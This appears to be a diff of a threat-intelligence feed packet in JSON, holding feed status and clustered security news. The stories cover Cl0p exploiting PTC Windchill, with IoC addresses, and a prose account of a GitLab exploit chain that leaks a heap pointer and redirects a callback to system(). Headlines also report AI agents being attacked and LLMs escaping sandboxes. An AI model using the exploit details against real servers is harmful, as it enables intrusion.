@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-07-25T11:17:32.584294+00:00",
+  "generated_at": "2026-07-25T13:48:58.716253+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
   "feeds_ok": 76,
-  "total_items_in_window": 315,
-  "total_clusters_raw": 148,
-  "total_clusters_in_packet": 63,
-  "dropped_low_score": 85,
+  "total_items_in_window": 309,
+  "total_clusters_raw": 145,
+  "total_clusters_in_packet": 64,
+  "dropped_low_score": 81,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -109,6 +109,13 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Sekoia": {
+      "url": "https://blog.sekoia.io/feed/",
+      "cohort": "threat_research_primary",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
     "Microsoft Threat Intelligence": {
       "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
       "cohort": "threat_research_primary",
@@ -123,32 +130,11 @@
       "item_count": 20,
       "in_window_count": 2
     },
-    "Sekoia": {
-      "url": "https://blog.sekoia.io/feed/",
-      "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "SANS Internet Storm Center": {
-      "url": "https://isc.sans.edu/rssfeed_full.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
     "Citizen Lab": {
       "url": "https://citizenlab.ca/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 1
-    },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
       "in_window_count": 1
     },
     "Kaspersky Securelist": {
@@ -158,12 +144,40 @@
       "item_count": 10,
       "in_window_count": 2
     },
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 4
+    },
+    "SANS Internet Storm Center": {
+      "url": "https://isc.sans.edu/rssfeed_full.xml",
+      "cohort": "government_authoritative",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
     "Cisco Talos": {
       "url": "https://feeds.feedburner.com/feedburner/Talos",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 15,
       "in_window_count": 3
+    },
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 1
+    },
+    "Horizon3 Attack Research": {
+      "url": "https://horizon3.ai/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 4
     },
     "ESET WeLiveSecurity": {
       "url": "https://www.welivesecurity.com/en/rss/feed/",
@@ -179,33 +193,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Horizon3 Attack Research": {
-      "url": "https://horizon3.ai/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 4
-    },
     "Red Canary": {
       "url": "https://redcanary.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 1
-    },
-    "GitHub Security Lab": {
-      "url": "https://github.blog/category/security/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 4
     },
     "Assetnote": {
       "url": "https://www.assetnote.io/resources/research/rss.xml",
@@ -221,18 +214,18 @@
       "item_count": 40,
       "in_window_count": 0
     },
+    "GitHub Security Lab": {
+      "url": "https://github.blog/category/security/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
     "Exploit-DB": {
       "url": "https://www.exploit-db.com/rss.xml",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 50,
-      "in_window_count": 0
-    },
-    "The DFIR Report": {
-      "url": "https://thedfirreport.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
       "in_window_count": 0
     },
     "watchTowr Labs": {
@@ -242,12 +235,19 @@
       "item_count": 15,
       "in_window_count": 0
     },
-    "Active Countermeasures": {
-      "url": "https://www.activecountermeasures.com/feed/",
+    "The DFIR Report": {
+      "url": "https://thedfirreport.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
+    },
+    "TrustedSec": {
+      "url": "https://www.trustedsec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 3
     },
     "Proofpoint Threat Insight": {
       "url": "https://www.proofpoint.com/us/rss.xml",
@@ -256,12 +256,12 @@
       "item_count": 10,
       "in_window_count": 4
     },
-    "TrustedSec": {
-      "url": "https://www.trustedsec.com/feed/",
+    "Active Countermeasures": {
+      "url": "https://www.activecountermeasures.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 3
+      "in_window_count": 0
     },
     "Sophos X-Ops": {
       "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
@@ -298,18 +298,18 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Trail of Bits": {
-      "url": "https://blog.trailofbits.com/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
     "Huntress": {
       "url": "https://www.huntress.com/blog/rss.xml",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 100,
+      "in_window_count": 0
+    },
+    "Trail of Bits": {
+      "url": "https://blog.trailofbits.com/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
       "in_window_count": 0
     },
     "AWS Security Blog": {
@@ -326,13 +326,6 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Rapid7": {
       "url": "https://www.rapid7.com/blog/rss/",
       "cohort": "offensive_vulnerability_research",
@@ -347,12 +340,12 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Cloudflare Security": {
-      "url": "https://blog.cloudflare.com/tag/security/rss/",
-      "cohort": "cloud_identity_infrastructure",
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 0
+      "in_window_count": 1
     },
     "Sysdig": {
       "url": "https://sysdig.com/feed/",
@@ -361,33 +354,19 @@
       "item_count": 100,
       "in_window_count": 2
     },
+    "Cloudflare Security": {
+      "url": "https://blog.cloudflare.com/tag/security/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
+    },
     "Wiz Research": {
       "url": "https://www.wiz.io/feed/rss.xml",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 4
-    },
-    "Coveware": {
-      "url": "https://www.coveware.com/blog?format=rss",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Cloudflare Radar": {
-      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
-    "Google Cloud Security": {
-      "url": "https://cloudblog.withgoogle.com/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 14
     },
     "Google DeepMind Blog": {
       "url": "https://deepmind.google/blog/rss.xml",
@@ -396,12 +375,26 @@
       "item_count": 100,
       "in_window_count": 2
     },
+    "Cloudflare Radar": {
+      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
+    },
     "OpenSSF Blog": {
       "url": "https://openssf.org/feed/",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 2
+    },
+    "Coveware": {
+      "url": "https://www.coveware.com/blog?format=rss",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Chainalysis": {
       "url": "https://www.chainalysis.com/blog/feed/",
@@ -410,12 +403,19 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Interconnects": {
-      "url": "https://www.interconnects.ai/feed",
-      "cohort": "ai_security_agentic_risk",
+    "Google Cloud Security": {
+      "url": "https://cloudblog.withgoogle.com/rss/",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 2
+      "in_window_count": 14
+    },
+    "BleepingComputer": {
+      "url": "https://www.bleepingcomputer.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 15
     },
     "The Record": {
       "url": "https://therecord.media/feed",
@@ -424,12 +424,12 @@
       "item_count": 5,
       "in_window_count": 5
     },
-    "BleepingComputer": {
-      "url": "https://www.bleepingcomputer.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
+    "Interconnects": {
+      "url": "https://www.interconnects.ai/feed",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 15
+      "item_count": 20,
+      "in_window_count": 2
     },
     "SecurityWeek": {
       "url": "https://www.securityweek.com/feed/",
@@ -445,6 +445,13 @@
       "item_count": 10,
       "in_window_count": 10
     },
+    "GreyNoise": {
+      "url": "https://www.greynoise.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
     "AI Snake Oil": {
       "url": "https://www.aisnakeoil.com/feed",
       "cohort": "ai_security_agentic_risk",
@@ -459,12 +466,12 @@
       "item_count": 30,
       "in_window_count": 17
     },
-    "GreyNoise": {
-      "url": "https://www.greynoise.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
+    "Dark Reading": {
+      "url": "https://www.darkreading.com/rss.xml",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
+      "item_count": 50,
+      "in_window_count": 24
     },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
@@ -473,12 +480,19 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Dark Reading": {
-      "url": "https://www.darkreading.com/rss.xml",
-      "cohort": "cyber_news_breach_reporting",
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
+      "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 50,
-      "in_window_count": 24
+      "item_count": 15,
+      "in_window_count": 1
+    },
+    "Schneier on Security": {
+      "url": "https://www.schneier.com/feed/atom/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 6
     },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
@@ -487,11 +501,11 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
-      "cohort": "practitioner_analysis",
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 15,
+      "item_count": 100,
       "in_window_count": 1
     },
     "Just Security": {
@@ -501,18 +515,11 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Schneier on Security": {
-      "url": "https://www.schneier.com/feed/atom/",
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 6
-    },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
       "in_window_count": 1
     },
     "Reddit r/cybersecurity": {
@@ -522,22 +529,22 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
       "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
+      "item_count": 20,
+      "in_window_count": 3
     },
-    "Reddit r/blueteamsec": {
-      "url": "https://www.reddit.com/r/blueteamsec/.rss",
+    "Reddit r/sysadmin": {
+      "url": "https://www.reddit.com/r/sysadmin/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
       "in_window_count": 0
     },
-    "Reddit r/netsecstudents": {
-      "url": "https://www.reddit.com/r/netsecstudents/.rss",
+    "Reddit r/blueteamsec": {
+      "url": "https://www.reddit.com/r/blueteamsec/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -550,8 +557,8 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Reddit r/sysadmin": {
-      "url": "https://www.reddit.com/r/sysadmin/.rss",
+    "Reddit r/netsecstudents": {
+      "url": "https://www.reddit.com/r/netsecstudents/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -563,13 +570,6 @@
       "status": "ok",
       "item_count": 0,
       "in_window_count": 0
-    },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
     },
     "The Hacker News": {
       "url": "https://feeds.feedburner.com/TheHackersNews",
@@ -597,20 +597,20 @@
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
-      "in_window_count": 21
-    },
-    "Embrace the Red": {
-      "url": "https://embracethered.com/blog/index.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
+      "in_window_count": 15
     },
     "tl;dr sec": {
       "url": "https://tldrsec.com/feed.xml",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 20,
+      "in_window_count": 1
+    },
+    "Embrace the Red": {
+      "url": "https://embracethered.com/blog/index.xml",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 100,
       "in_window_count": 1
     },
     "Risky Business News": {
@@ -774,7 +774,7 @@
     {
       "cluster_id": "56fb338f87",
       "priority_score": 55,
-      "member_count": 11,
+      "member_count": 10,
       "corroborating_source_count": 9,
       "strong_signals": [
         "CVE-2026-60137",
@@ -789,9 +789,7 @@
         "actor_attribution": [],
         "affected_industries": [],
         "affected_products": [
-          "Microsoft SharePoint",
           "OpenAI/ChatGPT",
-          "SonicWall",
           "WordPress"
         ],
         "tools_used": [],
@@ -807,7 +805,6 @@
           "preauth_unauth"
         ],
         "content_type": [
-          "intel_roundup",
           "news_report",
           "vulnerability_disclosure"
         ],
@@ -1435,36 +1432,6 @@
           }
         },
         {
-          "source": "The Hacker News",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "ChatGPT AgentForger Flaw Could Deploy Rogue Workspace Agents via a Phishing Link",
-          "link": "https://thehackernews.com/2026/07/chatgpt-agentforger-flaw-could-deploy.html",
-          "published": "2026-07-24T11:53:55+00:00",
-          "summary": "Cybersecurity researchers have disclosed a critical vulnerability in OpenAI's ChatGPT Workspace Agents that could have allowed a single phishing link to stealthily build, authorize, and deploy an autonomous artificial intelligence (AI) agent inside a victim's organization. The vulnerability has been codenamed AgentForger by Zenity Labs. The issue has since been addressed by OpenAI as of June 8,",
-          "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "OpenAI/ChatGPT"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "OpenAI/ChatGPT": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
           "source": "Risky Business News",
           "cohort": "practitioner_analysis",
           "title": "Risky Bulletin: Rogue OpenAI models were behind the Hugging Face breach",
@@ -1561,6 +1528,36 @@
           "summary": "Advanced LLMs escaped their sandboxes while attempting to achieve a non-malicious benchmark test objective.",
           "taxonomy": {
             "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "OpenAI/ChatGPT"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "OpenAI/ChatGPT": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "The Hacker News",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "ChatGPT AgentForger Flaw Could Deploy Rogue Workspace Agents via a Phishing Link",
+          "link": "https://thehackernews.com/2026/07/chatgpt-agentforger-flaw-could-deploy.html",
+          "published": "2026-07-24T11:53:55+00:00",
+          "summary": "Cybersecurity researchers have disclosed a critical vulnerability in OpenAI's ChatGPT Workspace Agents that could have allowed a single phishing link to stealthily build, authorize, and deploy an autonomous artificial intelligence (AI) agent inside a victim's organization. The vulnerability has been codenamed AgentForger by Zenity Labs. The issue has since been addressed by OpenAI as of June 8,",
+          "taxonomy": {
+            "threat_categories": [
+              "phishing_social_eng"
+            ],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [
@@ -2033,6 +2030,184 @@
       ]
     },
     {
+      "cluster_id": "efa5d95ebc",
+      "priority_score": 19,
+      "member_count": 2,
+      "corroborating_source_count": 2,
+      "strong_signals": [
+        "Cl0p"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "phishing_social_eng",
+          "ransomware_extortion",
+          "vulnerability_disclosure",
+          "web_shell_backdoor"
+        ],
+        "actor_attribution": [
+          "Cl0p",
+          "ShinyHunters"
+        ],
+        "affected_industries": [
+          "aviation_defense",
+          "manufacturing_industrial",
+          "retail_ecommerce"
+        ],
+        "affected_products": [
+          "Microsoft 365",
+          "Microsoft Entra",
+          "Salesforce"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-12569"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "The Hacker News",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Cl0p Affiliates Target Internet-Exposed PTC Windchill and FlexPLM with Unauthenticated RCE",
+        "link": "https://thehackernews.com/2026/07/cl0p-affiliates-target-internet-exposed.html",
+        "published": "2026-07-25T10:14:03+00:00",
+        "summary": "Threat actors linked to the Cl0p (aka Chubby Scorpius, FIN11, Graceful Spider, and Lace Tempest) ransomware campaign are exploiting flaws in internet-exposed PTC Windmill and FlexPLM deployments as part of a new data extortion campaign. \"Attackers chain a pre-authentication information disclosure in the FlexPLM WSDL endpoint with a server-side flaw in the Windchill login servlet, enabling",
+        "full_body": "Cl0p Affiliates Target Internet-Exposed PTC Windchill and FlexPLM with Unauthenticated RCE  Ravie Lakshmanan  Jul 25, 2026 Vulnerability / Ransomware Threat actors linked to the Cl0p (aka Chubby Scorpius, FIN11, Graceful Spider, and Lace Tempest) ransomware campaign are exploiting flaws in internet-exposed PTC Windmill and FlexPLM deployments as part of a new data extortion campaign. \"Attackers chain a pre-authentication information disclosure in the FlexPLM WSDL endpoint with a server-side flaw in the Windchill login servlet, enabling unauthenticated remote code execution and deployment of hex-named JSP web shells under /Windchill/login/,\" according to a new coordinated advisory released by Ransom-ISAC along with eCrime.ch and DEFUSED. Upon gaining an initial foothold, the attackers have been found to conduct file system enumeration, stage engineering/design data, and ultimately carry out double extortion data theft. Targets of the campaign include manufacturing, automotive, aerospace, and retail sectors. It's suspected that threat actors are exploiting CVE-2026-12569 (CVSS score: 9.3), a critical security flaw in PTC Windmill that was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) Known Exploited Vulnerabilities (KEV) catalog late last month. In an advisory, PTC warned customers that it had \"received continued reports of heightened threat activity,\" adding that unknown attackers are exploiting the vulnerability to deploy JSP web shells against susceptible systems. \"In the observed intrusions, this RCE is chained with a separate pre-authentication information-disclosure defect in the FlexPLM WSDL endpoint (CVSS v3.1 7.5) to enable unauthenticated exploitation,\" researchers Brandon Parsons, Corsin Camichel, and Simo Kohonen said. Ransom-ISAC has shared four IP addresses as indicators of compromise (IoCs), all of which match those shared by PTC - 216.152.148.54 216.152.151.204 104.243.35.63 5.180.41.35 The extortion emails appear to originate from previously compromised accounts and are sent to hundreds of users within an impacted organization, along with ways to contact the Cl0p ransomware crew. In a separate post on X, ReliaQuest said it observed threat actors actively exploiting CVE-2026-12569 to facilitate \"unauthenticated remote code execution and JSP web shell deployment for remote command execution and sensitive product data exfiltration.\" \"The actor behind these attacks remains unconfirmed. However, the observed tradecraft shares characteristics with previous Cl0p campaigns targeting enterprise applications and high-value data repositories,\" it added . The Cl0p gang has a storied history of going after security flaws in widely-used enterprise products to break into target organizations for data theft and extortion attacks. Previous campaigns mounted by the group have weaponized file transfer appliances , including those from Accellion FTA, GoAnywhere MFT, SolarWinds Serv-U FTP, Cleo, and MOVEit Transfer, as well as a vulnerability in Oracle E-Business Suite . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Cyber Attack , Cyber Crime , data breach , enterprise security , Malware , ransomware , remote code execution , Threat Intelligence , Vulnerability , Vulnerability Management ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Microsoft-Signed Linux UEFI Shims Could Let At",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "phishing_social_eng",
+            "data_breach",
+            "web_shell_backdoor",
+            "vulnerability_disclosure"
+          ],
+          "actor_attribution": [
+            "ShinyHunters",
+            "Cl0p"
+          ],
+          "affected_industries": [
+            "manufacturing_industrial",
+            "aviation_defense",
+            "retail_ecommerce"
+          ],
+          "affected_products": [
+            "Salesforce",
+            "Microsoft Entra",
+            "Microsoft 365"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-12569"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "preauth_unauth"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Salesforce": "target",
+            "Microsoft Entra": "target",
+            "Microsoft 365": "target",
+            "SolarWinds": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "The Hacker News",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Cl0p Affiliates Target Internet-Exposed PTC Windchill and FlexPLM with Unauthenticated RCE",
+          "link": "https://thehackernews.com/2026/07/cl0p-affiliates-target-internet-exposed.html",
+          "published": "2026-07-25T10:14:03+00:00",
+          "summary": "Threat actors linked to the Cl0p (aka Chubby Scorpius, FIN11, Graceful Spider, and Lace Tempest) ransomware campaign are exploiting flaws in internet-exposed PTC Windmill and FlexPLM deployments as part of a new data extortion campaign. \"Attackers chain a pre-authentication information disclosure in the FlexPLM WSDL endpoint with a server-side flaw in the Windchill login servlet, enabling",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "phishing_social_eng",
+              "data_breach",
+              "web_shell_backdoor",
+              "vulnerability_disclosure"
+            ],
+            "actor_attribution": [
+              "ShinyHunters",
+              "Cl0p"
+            ],
+            "affected_industries": [
+              "manufacturing_industrial",
+              "aviation_defense",
+              "retail_ecommerce"
+            ],
+            "affected_products": [
+              "Salesforce",
+              "Microsoft Entra",
+              "Microsoft 365"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-12569"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "preauth_unauth"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Salesforce": "target",
+              "Microsoft Entra": "target",
+              "Microsoft 365": "target",
+              "SolarWinds": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "BleepingComputer",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Clop ransomware targets Windchill, FlexPLM in data theft attacks",
+          "link": "https://www.bleepingcomputer.com/news/security/clop-ransomware-targets-windchill-flexplm-in-data-theft-attacks/",
+          "published": "2026-07-24T07:36:39+00:00",
+          "summary": "The Clop ransomware gang (also tracked as Cl0p) is targeting Internet-exposed PTC Windchill and FlexPLM instances in a new data theft extortion campaign. [...]",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
+            "actor_attribution": [
+              "Cl0p"
+            ],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "c4020d76d0",
       "priority_score": 17,
       "member_count": 1,
@@ -2242,31 +2417,34 @@
       ]
     },
     {
-      "cluster_id": "1a5eab7c27",
+      "cluster_id": "e67ac609ab",
       "priority_score": 15,
       "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [
-        "GitLab"
+        "CVE-2026-16723"
       ],
       "taxonomy": {
         "threat_categories": [
           "active_exploitation"
         ],
         "actor_attribution": [],
-        "affected_industries": [],
+        "affected_industries": [
+          "financial_services",
+          "healthcare",
+          "retail_ecommerce"
+        ],
         "affected_products": [
-          "GitLab"
+          "GitHub"
         ],
         "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "no_patch_yet",
-          "poc_available"
+        "cve_ids": [
+          "CVE-2026-16723"
         ],
+        "attack_techniques": [],
+        "urgency_signals": [],
         "content_type": [
-          "news_report"
+          "vulnerability_disclosure"
         ],
         "confidence_tier": [
           "tier_4_news"
@@ -2275,32 +2453,35 @@
       "primary": {
         "source": "The Hacker News",
         "cohort": "cyber_news_breach_reporting",
-        "title": "Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git",
-        "link": "https://thehackernews.com/2026/07/researcher-publishes-gitlab-rce-poc.html",
-        "published": "2026-07-25T08:34:15+00:00",
-        "summary": "Security researcher Yuhang Wu at depthfirst has published a working proof-of-concept (PoC) exploit that executes commands as git on an unpatched self-managed GitLab 18.11.3 server. An ordinary authenticated user triggers it by committing two crafted Jupyter notebooks and requesting their diff. The chain needs no administrator rights, continuous integration (CI) runner access, victim interaction",
-        "full_body": "Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git  Swati Khandelwal  Jul 25, 2026 Vulnerability / Application Security Security researchers at depthfirst published working exploit code on July 24 for a GitLab flaw that GitLab patched six weeks earlier, on June 10. It runs commands as git on any self-managed 18.11.3 server that has not taken the update. Any authenticated user who can push to a project can run it. The attacker commits a crafted Jupyter notebook and opens its commit diff, which leaks a heap pointer. Enough of those and an automated probe can locate the libraries in memory. Two more notebooks then fire the payload. No administrator rights, no CI or runner access, no victim interaction, no access to anyone else's project. GitLab did not file the fix as a security fix. A review by The Hacker News found the Oj 3.17.3 bump listed under bug fixes in the June 10 patch release , not in the security-fix table. There is no CVE, no CVSS score, and no mention of the notebook-diff chain. Operators who triaged that release against the security table had no reason to treat it as urgent. Two memory corruption bugs in Oj, a Ruby JSON parser implemented largely in native C, make the chain work. depthfirst says its system flagged them autonomously, and researchers chained them by hand. GitLab's notebook renderer, an in-tree gem called ipynbdiff , passes repository-controlled .ipynb JSON to Oj::Parser.usual.parse inside a long-lived Puma worker, so attacker-controlled bytes reach Oj's manually managed C memory inside the application process. One bug writes past a fixed 1,024-byte nesting stack until it controls the parser's start callback. The other truncates a 65,565-byte object key to 29 in a signed 16-bit field and returns a live heap pointer, which GitLab renders into the diff. The leak locates libc, and the write points the callback at system() . Component Affected First fixed GitLab CE/EE 15.2.0 to 18.10.7 18.10.8 GitLab CE/EE 18.11.0 to 18.11.4 18.11.5 GitLab CE/EE 19.0.0 to 19.0.1 19.0.2 Oj gem 3.13.0 to 3.17.1 3.17.3 All tiers are affected, CE and EE, Free through Ultimate. Ruby itself is not. Oj 3.17.2 carried other fixes from the same review but not these two. Upgrade to 18.10.8 , 18.11.5 , or 19.0.2 . Neither GitLab nor depthfirst offers a workaround for anyone who cannot. The trap is Helm and Operator: check the GitLab version inside the Webservice image running Puma, not the chart or Operator version. Anything on 15.2 through 18.9 gets no backport, because those lines sit outside GitLab's security-maintained patch trains , so 